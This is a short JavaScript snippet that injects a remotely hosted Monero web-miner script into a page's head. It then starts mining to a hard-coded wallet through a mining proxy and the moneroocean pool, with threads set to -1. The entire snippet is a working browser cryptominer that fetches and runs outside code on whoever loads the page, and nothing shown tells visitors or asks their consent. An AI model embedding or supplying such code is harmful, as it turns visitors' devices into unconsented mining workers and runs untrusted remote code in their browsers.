// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://ny1.xmrminingproxy.com";
var pool = "moneroocean.stream";
var walletAddress = "4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 2;
// End Of Mining Code
